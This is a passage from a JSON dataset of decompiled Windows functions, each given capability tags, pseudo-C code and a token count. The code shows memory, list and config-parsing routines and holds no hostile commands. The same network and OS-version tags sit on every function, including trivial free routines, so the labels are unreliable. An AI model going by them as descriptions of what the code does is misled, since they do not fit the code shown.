0x5e, 0x80051670, 2),  iVar2 != 0)))) &&\n                           (((arg_10h[6] = arg_10h[6] + *(var_23ch + 0x28),  arg_ch == NULL ||\n                             ((*(var_23ch + 0x38) & 0x10) != 0)) ||\n                            (var_14h = fcn.00078bee(*(var_23ch + 0x18) + 0x2ac18000, \n                                                    (*(var_23ch + 0x1c) + -0x19db1de) -\n                                                    (*(var_23ch + 0x18) < 0xd53e8000), 10000000, 0),  *arg_ch <= var_14h\n                            )))) {\n                            var_240h = var_288h;\n                            iVar2 = fcn.00057d40(&var_288h, var_4h * 4 + 4, var_4h * 4 + 8);\n                            if (iVar2 == -1) {\n                                var_288h = var_240h;\n                                var_26ch = 0x21590004;\n                                goto code_r0x00018e2d;\n                            }\n                            var_288h[var_4h + 1] = 0;\n                            uVar1 = fcn.00018680(var_23ch + 0x5e, *(var_23ch + 0x3c) >> 1);\n                            var_288h[var_4h] = uVar1;\n                            if (var_288h[var_4h] == 0) {\n                                var_26ch = 0x21590004;\n                                goto code_r0x00018e2d;\n                            }\n                            uVar1 = fcn.00078bee(*(var_23ch + 0x18) + 0x2ac18000, \n                                                 (*(var_23ch + 0x1c) + -0x19db1de) - (*(var_23ch + 0x18) < 0xd53e8000), \n                                                 10000000, 0);\n                            *(var_288h[var_4h] + 4) = uVar1;\n                            uVar1 = fcn.00078bee(*(var_23ch + 8) + 0x2ac18000, \n                                                 (*(var_23ch + 0xc) + -0x19db1de) - (*(var_23ch + 8) < 0xd53e8000), \n                                                 10000000, 0);\n                            *(var_288h[var_4h] + 8) = uVar1;\n                            uVar1 = fcn.00078bee(*(var_23ch + 0x20) + 0x2ac18000, \n                                                 (*(var_23ch + 0x24) + -0x19db1de) - (*(var_23ch + 0x20) < 0xd53e8000), \n                                                 10000000, 0);\n                            *(var_288h[var_4h] + 0x10) = uVar1;\n                            uVar1 = fcn.00078bee(*(var_23ch + 0x10) + 0x2ac18000, \n                                                 (*(var_23ch + 0x14) + -0x19db1de) - (*(var_23ch + 0x10) < 0xd53e8000), \n                                                 10000000, 0);\n                            *(var_288h[var_4h] + 0xc) = uVar1;\n                            *(var_288h[var_4h] + 0x14) = *(var_23ch + 0x38);\n                            if ((*(var_23ch + 0x38) & 0x10) == 0) {\n                                *(var_288h[var_4h] + 0x18) = *(var_23ch + 0x28);\n                            }\n                            else {\n                                *(var_288h[var_4h] + 0x18) = 0;\n                            }\n                            var_4h = var_4h + 1;\n                        }\n                        var_18h = var_18h + 1;\n                    }\n                    if (var_234h == -0x7ffffffa) {\n                        var_26ch = 0;\n                    }\n                    else {\n                        var_26ch = fcn.00078a2c(var_234h);\n                    }\n                    if (var_26ch == 0) {\n                        arg_10h[7] = var_288h;\n                    }\n                }\n                else {\n                    var_26ch = fcn.00078a2c(var_234h);\n                }\n            }\ncode_r0x00018e2d:\n            if ((var_288h != NULL) && (var_26ch != 0)) {\n                for (var_18h = 0; var_288h[var_18h] != 0; var_18h = var_18h + 1) {\n                    fcn.00019200(var_288h[var_18h]);\n                }\n                fcn.000357f0(var_288h);\n            }\n            fcn.000357f0(var_1ch);\n            if (var_8h != 0) {\n                fcn.000789b4(var_8h);\n            }\n        }\n    }\n    return var_26ch;\n}\n",
        "token_count": 2497
    },
    "00018eb0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00018eb0(int32_t arg_8h, uint32_t arg_ch)\n\n{\n    int32_t iVar1;\n    uint var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    iVar1 = *(arg_8h + 0x1c);\n    var_4h = 0;\n    for (var_8h = 0; (iVar1 != 0 && (*(iVar1 + var_8h * 4) != 0)); var_8h = var_8h + 1) {\n        if ((*(*(iVar1 + var_8h * 4) + 0x14) & arg_ch) != 0) {\n            var_4h = var_4h + 1;\n        }\n    }\n    return var_4h;\n}\n",
        "token_count": 188
    },
    "00018f10": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_228h\n\nint32_t __cdecl fcn.00018f10(int32_t arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, int32_t **arg_18h)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t var_228h;\n    uint var_20h;\n    uint var_1ch;\n    int32_t var_18h;\n    uint32_t var_14h;\n    int32_t var_10h;\n    uint32_t var_ch;\n    int32_t var_8h;\n    int32_t *var_4h;\n    \n    var_4h = NULL;\n    if (arg_8h == 0) {\n        var_10h = 0x21590065;\n    }\n    else if (arg_18h == NULL) {\n        var_10h = 0x21590069;\n    }\n    else {\n        *arg_18h = NULL;\n        var_4h = fcn.000356c0(8);\n        if (var_4h == NULL) {\n            var_10h = 0x21590004;\n        }\n        else {\n            var_4h[1] = 0;\n            iVar2 = fcn.00018710(arg_8h);\n            *var_4h = iVar2;\n            if (*var_4h == 0) {\n                var_10h = 0x21590004;\n            }\n            else {\n                var_14h = 1;\n                for (var_8h = 0; var_4h[var_8h] != 0; var_8h = var_8h + 1) {\n                    var_10h = fcn.00018890(arg_ch, arg_14h, var_4h[var_8h]);\n                    if (var_10h != 0) goto code_r0x000191a8;\n                    if (arg_10h != '\\0') {\n                        var_228h = var_4h[var_8h];\n                        iVar2 = fcn.00018eb0(var_228h, 0x10);\n                        piVar1 = var_4h;\n                        if (0 < iVar2) {\n                            iVar3 = fcn.00057d40(&var_4h, var_14h * 4 + 4, (var_14h + 1 + iVar2) * 4);\n                            if (iVar3 == -1) {\n                                var_10h = 0x21590004;\n                                var_4h = piVar1;\n                                goto code_r0x000191a8;\n                            }\n                            for (var_ch = var_14h; var_ch < var_14h + 1 + iVar2; var_ch = var_ch + 1) {\n                                var_4h[var_ch] = 0;\n                            }\n                            var_18h = 0;\n                            for (var_ch = var_14h; var_ch < var_14h + iVar2; var_ch = var_ch + 1) {\n                                while ((*(*(var_4h[var_8h] + 0x1c) + var_18h * 4) != 0 &&\n                                       ((*(*(*(var_4h[var_8h] + 0x1c) + var_18h * 4) + 0x14) & 0x10) == 0))) {\n                                    var_18h = var_18h + 1;\n                                }\n                                if (*(*(var_4h[var_8h] + 0x1c) + var_18h * 4) == 0) {\n                                    fcn.000789c6(&var_228h, 0x104, 0x80051684, *var_4h[var_8h]);\n                                }\n                                else {\n                                    fcn.000789c6(&var_228h, 0x104, 0x80051678, *var_4h[var_8h], \n                                                 **(*(var_4h[var_8h] + 0x1c) + var_18h * 4));\n                                }\n                                iVar3 = fcn.00018710(&var_228h);\n                                var_4h[var_ch] = iVar3;\n                                if (var_4h[var_ch] == 0) {\n                                    var_10h = 0x21590004;\n                                    goto code_r0x000191a8;\n                                }\n                                var_18h = var_18h + 1;\n                            }\n                            var_14h = var_14h + iVar2;\n                        }\n                    }\n                }\n                var_10h = 0;\n                *arg_18h = var_4h;\n            }\ncode_r0x000191a8:\n            if (var_10h != 0) {\n                for (var_ch = 0; var_4h[var_ch] != 0; var_ch = var_ch + 1) {\n                    fcn.00019230(var_4h[var_ch]);\n                }\n                fcn.000357f0(var_4h);\n            }\n        }\n    }\n    return var_10h;\n}\n",
        "token_count": 1152
    },
    "00019200": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00019200(uint *arg_8h)\n\n{\n    if (arg_8h != NULL) {\n        fcn.000357f0(*arg_8h);\n        fcn.000357f0(arg_8h);\n    }\n    return;\n}\n",
        "token_count": 62
    },
    "00019230": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00019230(uint *arg_8h)\n\n{\n    int32_t var_4h;\n    \n    if (arg_8h != NULL) {\n        for (var_4h = 0; (arg_8h[7] != 0 && (*(arg_8h[7] + var_4h * 4) != 0)); var_4h = var_4h + 1) {\n            var_4h = *(arg_8h[7] + var_4h * 4);\n            fcn.00019200(var_4h);\n        }\n        fcn.000357f0(*arg_8h);\n        fcn.000357f0(arg_8h[7]);\n        fcn.000357f0(arg_8h);\n    }\n    return;\n}\n",
        "token_count": 198
    },
    "000192b0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t fcn.000192b0(void)\n\n{\n    int32_t iVar1;\n    uint var_4h;\n    \n    fcn.000349b0(0x800cdc58);\n    fcn.00037440(0x800cdc5c);\n    *0x800cdc54 = 1;\n    iVar1 = fcn.0001ace0(0x800cccb8, 0x80059ca0, 0);\n    if (iVar1 != 0) {\n        fcn.000376a0(0x800cdc5c);\n        fcn.000349e0(0x800cdc58);\n    }\n    return iVar1;\n}\n",
        "token_count": 149
    },
    "000193e0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_54h\n\nvoid fcn.000193e0(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint uVar4;\n    uint var_54h;\n    uint var_4ch;\n    uint *var_48h;\n    uint32_t var_44h;\n    uint var_40h;\n    int32_t var_3ch;\n    int32_t var_38h;\n    int32_t var_34h;\n    uint var_30h;\n    uint32_t var_20h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    int32_t var_8h;\n    \n    var_38h = 0;\n    var_34h = 0;\n    if ((*0x800cdc54 != '\\0') && (iVar2 = fcn.000533b0(0x800cdc68, 1, 0),  iVar2 == 0)) {\n        iVar2 = fcn.00078a50(0xffffffff, 0, &var_18h, 0x18, 0);\n        if ((iVar2 == 0) &&\n           ((((var_18h == 0x103 && (var_8h != 0)) && (var_8h != *(*0x800cc770 + 0x14))) &&\n            ((iVar2 = fcn.00036d40(&var_30h, 0x10),  iVar2 != 0 && (iVar2 = fcn.00034a30(0x800cdc58),  iVar2 != 0))))))\n        {\n            for (var_20h = 0; var_20h < 0x32; var_20h = var_20h + 1) {\n                if ((*(var_20h * 0x24 + -0x7ff3237f) != '\\0') && (*(var_20h * 0x24 + -0x7ff32380) != '\\0')) {\n                    var_48h = &var_30h;\n                    do {\n                        cVar1 = *var_48h;\n                        var_48h = var_48h + 1;\n                    } while (cVar1 != '\\0');\n                    var_1ch = var_48h - (&var_30h + 1);\n                    var_3ch = *(var_20h * 0x24 + -0x7ff32394) + -1;\n                    while ((var_3ch != 0 &&\n                           (((var_3ch = var_3ch + 1,  *(var_3ch + var_1ch) != ',' && (*(var_3ch + var_1ch) != '\\0')) ||\n                            (iVar2 = fcn.00078a3e(&var_30h, var_3ch, var_1ch),  iVar2 != 0))))) {\n                        var_3ch = fcn.00078a44(var_3ch, 0x2c);\n                    }\n                    if (var_3ch != 0) {\n                        for (var_44h = 0; var_44h < *(var_20h * 0x24 + -0x7ff32378); var_44h = var_44h + 1) {\n                            if ((*(*(var_20h * 0x24 + -0x7ff32374) + 0x10 + var_44h * 0x20) != 0) &&\n                               (iVar2 = fcn.00037590(0x800cdc5c, 1),  iVar2 != 0)) {\n                                fcn.00078be8(var_44h * 0x20 + *(var_20h * 0x24 + -0x7ff32374), \n                                             (var_44h + 1) * 0x20 + *(var_20h * 0x24 + -0x7ff32374), \n                                             ((*(var_20h * 0x24 + -0x7ff32378) - var_44h) + -1) * 0x20);\n                                fcn.00057d40(var_20h * 0x24 + -0x7ff32374, *(var_20h * 0x24 + -0x7ff32378) << 5, \n                                             (*(var_20h * 0x24 + -0x7ff32378) + -1) * 0x20);\n                                *(var_20h * 0x24 + -0x7ff32378) = *(var_20h * 0x24 + -0x7ff32378) + -1;\n                                fcn.00037550(0x800cdc5c, 1);\n                                fcn.00034a80(0x800cdc58);\n                                goto code_r0x00019940;\n                            }\n                            if (*(*(var_20h * 0x24 + -0x7ff32374) + 4 + var_44h * 0x20) == var_8h) break;\n                        }\n                        if (var_44h < *(var_20h * 0x24 + -0x7ff32378)) {\n                            var_34h = var_44h * 0x20 + *(var_20h * 0x24 + -0x7ff32374);\n                            if (((((*(*(var_20h * 0x24 + -0x7ff32374) + 0x14 + var_44h * 0x20) == 0) &&\n                                  (*(*(var_20h * 0x24 + -0x7ff32374) + 8 + var_44h * 0x20) == 0)) &&\n                                 ((*(*(var_20h * 0x24 + -0x7ff32374) + 0xc + var_44h * 0x20) == 0 &&\n                                  (iVar2 = fcn.00036320(0), \n                                  0x13 < iVar2 - *(*(var_20h * 0x24 + -0x7ff32374) + var_44h * 0x20))))) &&\n                                ((*(var_20h * 0x24 + -0x7ff3237e) == '\\0' ||\n                                 (iVar2 = fcn.000533b0(var_20h * 0x24 + -0x7ff3237c, 0, 0),  iVar2 < 1)))) &&\n                               ((*(var_20h * 0x24 + -0x7ff32384) == 0 ||\n                                (iVar2 = fcn.00019390(*(var_20h * 0x24 + -0x7ff32384)),  iVar2 != 0)))) {\n                                fcn.00037400(var_20h * 0x24 + -0x7ff3237c);\n                                fcn.00037470(0x800cdc5c, 0);\n                                var_38h = var_20h * 0x24 + -0x7ff32394;\n                                *(var_34h + 8) = 1;\n                                break;\n                            }\n                        }\n                        else {\n                            iVar2 = *(var_20h * 0x24 + -0x7ff32378);\n                            iVar3 = fcn.00057d40(var_20h * 0x24 + -0x7ff32374, iVar2 << 5, (iVar2 + 1) * 0x20);\n                            if (iVar3 == 0) {\n                                *(*(var_20h * 0x24 + -0x7ff32374) + 4 + iVar2 * 0x20) = var_8h;\n                                *(*(var_20h * 0x24 + -0x7ff32374) + 0x14 + iVar2 * 0x20) = 0;\n                                uVar4 = fcn.00036320(0);\n                                *(iVar2 * 0x20 + *(var_20h * 0x24 + -0x7ff32374)) = uVar4;\n                                *(*(var_20h * 0x24 + -0x7ff32374) + 8 + iVar2 * 0x20) = 0;\n                                *(*(var_20h * 0x24 + -0x7ff32374) + 0xc + iVar2 * 0x20) = 0;\n                                *(*(var_20h * 0x24 + -0x7ff32374) + 0x10 + iVar2 * 0x20) = 0;\n                                *(*(var_20h * 0x24 + -0x7ff32374) + 0x18 + iVar2 * 0x20) = 0;\n                                *(*(var_20h * 0x24 + -0x7ff32374) + 0x1c + iVar2 * 0x20) = 0;\n                                *(var_20h * 0x24 + -0x7ff32378) = *(var_20h * 0x24 + -0x7ff32378) + 1;\n                            }\n                        }\n                    }\n                }\n            }\n            fcn.00034a80(0x800cdc58);\n            if ((var_20h < 0x32) && (iVar2 = fcn.00019b90(var_38h, var_34h, 0x8005a3a0, 0),  iVar2 != 0)) {\n                *(var_34h + 8) = 0;\n                fcn.00037550(0x800cdc5c, 0);\n            }\n        }\ncode_r0x00019940:\n        fcn.00037420(0x800cdc68);\n    }\n    return;\n}\n",
        "token_count": 2195
    },
    "00019950": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00019950(char *arg_8h, int32_t arg_ch)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint var_24h;\n    uint var_1ch;\n    char *var_18h;\n    uint32_t var_14h;\n    int32_t var_10h;\n    uint32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    if (*0x800cdc54 != '\\0') {\n        fcn.00034a10(0x800cdc58);\n        for (var_ch = 0; var_ch < 0x32; var_ch = var_ch + 1) {\n            if ((*(var_ch * 0x24 + -0x7ff3237f) != '\\0') && (*(var_ch * 0x24 + -0x7ff32380) != '\\0')) {\n                var_10h = *(var_ch * 0x24 + -0x7ff32394);\n                var_18h = arg_8h;\n                do {\n                    cVar1 = *var_18h;\n                    var_18h = var_18h + 1;\n                } while (cVar1 != '\\0');\n                iVar2 = var_18h - (arg_8h + 1);\n                var_14h = 0;\n                while (((*(var_10h + iVar2) != ',' && (*(var_10h + iVar2) != '\\0')) ||\n                       (iVar3 = fcn.00078a3e(arg_8h, var_10h, iVar2),  iVar3 != 0))) {\n                    var_10h = fcn.00078a44(var_10h, 0x2c);\n                    var_14h = var_14h + 1 + iVar2;\n                    if ((var_10h == 0) || (0x103 < var_14h + iVar2)) break;\n                }\n                if (var_10h != 0) {\n                    for (var_14h = 0; var_14h < *(var_ch * 0x24 + -0x7ff32378); var_14h = var_14h + 1) {\n                        if (*(*(var_ch * 0x24 + -0x7ff32374) + 4 + var_14h * 0x20) == arg_ch) {\n                            if ((*(*(var_ch * 0x24 + -0x7ff32374) + 0x14 + var_14h * 0x20) == 0) ||\n                               (*(*(var_ch * 0x24 + -0x7ff32374) + 0x10 + var_14h * 0x20) != 0)) {\n                                *(*(var_ch * 0x24 + -0x7ff32374) + 0x10 + var_14h * 0x20) = 1;\n                            }\n                            else {\n                                *(*(var_ch * 0x24 + -0x7ff32374) + 0x10 + var_14h * 0x20) = 1;\n                                fcn.00037470(0x800cdc5c, 0);\n                                iVar2 = fcn.00019b90(var_ch * 0x24 + -0x7ff32394, \n                                                     var_14h * 0x20 + *(var_ch * 0x24 + -0x7ff32374), 0x8005a5d0, 1);\n                                if (iVar2 != 0) {\n                                    fcn.00037550(0x800cdc5c, 0);\n                                }\n                            }\n                            break;\n                        }\n                    }\n                }\n            }\n        }\n        fcn.00034a80(0x800cdc58);\n    }\n    return;\n}\n",
        "token_count": 857
    },
    "00019b90": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00019b90(uint arg_8h, uint arg_ch, code *arg_10h, uint arg_14h)\n\n{\n    uint *arg_10h_00;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    int32_t var_4h;\n    \n    var_10h = 0;\n    var_4h = fcn.00078a4a(0xffffffff, 6, &var_10h, 4);\n    if (var_4h == 0) {\n        arg_10h_00 = fcn.000356c0(0xc);\n        if (arg_10h_00 == NULL) {\n            var_4h = 0x21590004;\n        }\n        else {\n            *arg_10h_00 = arg_8h;\n            arg_10h_00[1] = arg_ch;\n            var_4h = (**0x8005129c)(0xfffffffe, 0, 0, 0, arg_10h_00 + 2, 0);\n            if (var_4h == 0) {\n                if (arg_14h == '\\0') {\n                    var_4h = fcn.0001ace0(&var_ch, arg_10h, arg_10h_00);\n                    if (var_4h != 0) {\n                        (**0x800512e0)();\n                        fcn.000357f0(arg_10h_00);\n                        return var_4h;\n                    }\n                }\n                else {\n                    var_4h = (*arg_10h)(arg_10h_00);\n                }\n                if (arg_14h == '\\0') {\n                    fcn.00037820(&var_ch);\n                    fcn.00037760(&var_ch, 0);\n                    fcn.00037710(&var_ch);\n                }\n                var_4h = 0;\n            }\n            else {\n                fcn.000357f0(arg_10h_00);\n            }\n        }\n    }\n    return var_4h;\n}\n",
        "token_count": 462
    },
    "00019d20": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_20h\n// WARNING: Variable defined which should be unmapped: var_1ch\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Variable defined which should be unmapped: var_14h\n\nuint32_t __cdecl fcn.00019d20(int32_t **arg_8h, uint32_t *arg_ch)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    uint var_20h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    int32_t *var_14h;\n    int32_t *var_10h;\n    uint32_t var_ch;\n    uint32_t var_8h;\n    uint32_t var_4h;\n    \n    piVar1 = fcn.000356c0(13000);\n    *arg_8h = piVar1;\n    if (*arg_8h == NULL) {\n        return 0;\n    }\n    *arg_ch = 0;\n    var_8h = 0x28b;\n    while ((var_8h < 0x2be && (*arg_ch + 0x104 < 13000))) {\n        iVar2 = fcn.000294e0(var_8h, *arg_8h + *arg_ch, 0x104, &var_4h);\n        if (iVar2 == 0) {\n            *arg_ch = (var_4h - 1) + *arg_ch;\n        }\n        *(*arg_8h + *arg_ch) = 0;\n        *arg_ch = *arg_ch + 1;\n        var_8h = var_8h + 1;\n    }\n    fcn.00034a10(0x800cdc58);\n    if ((*0x800ce37c != NULL) && (*arg_ch == *0x800ce374)) {\n        var_ch = *arg_ch;\n        var_10h = *0x800ce37c;\n        var_14h = *arg_8h;\n        for (; 3 < var_ch; var_ch = var_ch - 4) {\n            if (*var_14h != *var_10h) goto code_r0x00019e38;\n            var_10h = var_10h + 1;\n            var_14h = var_14h + 1;\n        }\n        if (var_ch == 0) {\ncode_r0x00019eba:\n            var_1ch = 0;\n        }\n        else {\ncode_r0x00019e38:\n            var_18h = *var_14h - *var_10h;\n            if (var_18h == 0) {\n                if (var_ch == 1) goto code_r0x00019eba;\n                var_18h = *(var_14h + 1) - *(var_10h + 1);\n                if (var_18h == 0) {\n                    if (var_ch == 2) goto code_r0x00019eba;\n                    var_18h = *(var_14h + 2) - *(var_10h + 2);\n                    if (var_18h == 0) {\n                        if ((var_ch == 3) || (var_18h = *(var_14h + 3) - *(var_10h + 3),  var_18h == 0))\n                        goto code_r0x00019eba;\n                    }\n                }\n            }\n            var_1ch = 1;\n            if (var_18h < 1) {\n                var_1ch = -1;\n            }\n        }\n        if (var_1ch == 0) {\n            for (var_8h = 0; var_8h < 0x32; var_8h = var_8h + 1) {\n                if ((*(var_8h * 0x24 + -0x7ff3237f) != '\\0') && (*(var_8h * 0x24 + -0x7ff32380) != '\\0')) {\n                    for (var_4h = 0; var_4h < *(var_8h * 0x24 + -0x7ff32378); var_4h = var_4h + 1) {\n                        *(*(var_8h * 0x24 + -0x7ff32374) + 8 + var_4h * 0x20) = 0;\n                    }\n                }\n            }\n            var_8h = 0;\n            goto code_r0x00019f72;\n        }\n    }\n    var_8h = 1;\ncode_r0x00019f72:\n    fcn.00034a80(0x800cdc58);\n    if (var_8h == 0) {\n        fcn.000357f0(*arg_8h);\n    }\n    return var_8h;\n}\n",
        "token_count": 1093
    },
    "00019fa0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00019fa0(uint8_t *arg_8h, int32_t arg_ch)\n\n{\n    uint8_t uVar1;\n    int32_t iVar2;\n    uchar *puVar3;\n    uint8_t *puVar4;\n    char *pcVar5;\n    bool bVar6;\n    uint var_28h;\n    int32_t var_24h;\n    uint8_t *var_1ch;\n    uint8_t *var_18h;\n    int32_t var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint8_t *var_8h;\n    uint var_4h;\n    \n    iVar2 = fcn.000356c0(arg_ch);\n    if (iVar2 != 0) {\n        fcn.00078be8(iVar2, arg_8h, arg_ch);\n        fcn.00034a10(0x800cdc58);\n        fcn.000357f0(*0x800ce37c);\n        *0x800ce378 = arg_8h;\n        *0x800ce374 = arg_ch;\n        puVar4 = arg_8h + arg_ch;\n        var_14h = 0;\n        *0x800ce37c = iVar2;\n        while (arg_8h < puVar4) {\n            for (var_8h = arg_8h; (*var_8h != 0 && (var_8h < puVar4)); var_8h = var_8h + 1) {\n            }\n            if ((*arg_8h != 0) && (puVar3 = fcn.00078a44(arg_8h, 0x23),  puVar3 != NULL)) {\n                *puVar3 = 0;\n                var_18h = 0x80051698;\n                var_1ch = arg_8h;\n                do {\n                    uVar1 = *var_1ch;\n                    bVar6 = uVar1 < *var_18h;\n                    if (uVar1 != *var_18h) {\ncode_r0x0001a0d4:\n                        var_24h = (1 - bVar6) - (bVar6 != 0);\n                        goto code_r0x0001a0dc;\n                    }\n                    if (uVar1 == 0) break;\n                    uVar1 = var_1ch[1];\n                    bVar6 = uVar1 < var_18h[1];\n                    if (uVar1 != var_18h[1]) goto code_r0x0001a0d4;\n                    var_1ch = var_1ch + 2;\n                    var_18h = var_18h + 2;\n                } while (uVar1 != 0);\n                var_24h = 0;\ncode_r0x0001a0dc:\n                if (var_24h == 0) {\n                    *(var_14h * 0x24 + -0x7ff32394) = puVar3 + 1;\n                    puVar3 = fcn.00078a44(puVar3 + 1, 0x23);\n                    if (puVar3 != NULL) {\n                        *puVar3 = 0;\n                        *(var_14h * 0x24 + -0x7ff3238c) = puVar3 + 1;\n                        puVar3 = fcn.00078a44(puVar3 + 1, 0x23);\n                        if (puVar3 != NULL) {\n                            *puVar3 = 0;\n                            *(var_14h * 0x24 + -0x7ff32388) = puVar3 + 1;\n                            puVar3 = fcn.00078a44(puVar3 + 1, 0x23);\n                            if (puVar3 != NULL) {\n                                *puVar3 = 0;\n                                pcVar5 = puVar3 + 1;\n                                if ((puVar3[2] == '#') || (puVar3[2] == '\\0')) {\n                                    if ((*pcVar5 == '1') || ((*pcVar5 == 'y' || (*pcVar5 == 'Y')))) {\n                                        *(var_14h * 0x24 + -0x7ff3237e) = 1;\n                                    }\n                                    else {\n                                        if (((*pcVar5 != '0') && (*pcVar5 != 'n')) && (*pcVar5 != 'N'))\n                                        goto code_r0x0001a2ad;\n                                        *(var_14h * 0x24 + -0x7ff3237e) = 0;\n                                    }\n                                    puVar3 = fcn.00078a44(pcVar5, 0x23);\n                                    if (puVar3 == NULL) {\n                                        *(var_14h * 0x24 + -0x7ff32384) = 0;\n                                    }\n                                    else {\n                                        *puVar3 = 0;\n                                        *(var_14h * 0x24 + -0x7ff32384) = puVar3 + 1;\n                                    }\n                                    *(var_14h * 0x24 + -0x7ff3237f) = 1;\n                                    *(var_14h * 0x24 + -0x7ff32380) = 1;\n                                    *(var_14h * 0x24 + -0x7ff32378) = 0;\n                                    *(var_14h * 0x24 + -0x7ff3237c) = 0;\n                                    *(var_14h * 0x24 + -0x7ff32374) = 0;\n                                }\n                            }\n                        }\n                    }\n                }\n            }\ncode_r0x0001a2ad:\n            var_14h = var_14h + 1;\n            arg_8h = var_8h + 1;\n        }\n        fcn.00034a80(0x800cdc58);\n    }\n    return;\n}\n",
        "token_count": 1317
    },
    "0001a2e0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0001a2e0(uint arg_8h, int32_t arg_ch, uint arg_10h)\n\n{\n    int32_t arg_10h_00;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    var_8h = fcn.00036370(arg_ch + 1, 0, 0);\n    var_4h = fcn.00029500(3, var_8h, 0, 0, &var_ch, 0);\n    if (var_4h == 0) {\n        arg_10h_00 = fcn.000356c0(var_ch);\n        if (arg_10h_00 == 0) {\n            var_4h = 0x21590004;\n        }\n        else {\n            var_4h = fcn.00029500(3, var_8h, arg_10h_00, var_ch, &var_ch, 0);\n            if (var_4h == 0) {\n                var_4h = fcn.0005d0f0(arg_8h, arg_10h_00, arg_ch, arg_ch, arg_10h);\n            }\n            fcn.000357f0(arg_10h_00);\n        }\n    }\n    else {\n        var_4h = var_4h + 0x191 | 0x21590000;\n    }\n    return var_4h;\n}\n",
        "token_count": 337
    },
    "0001a3a0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
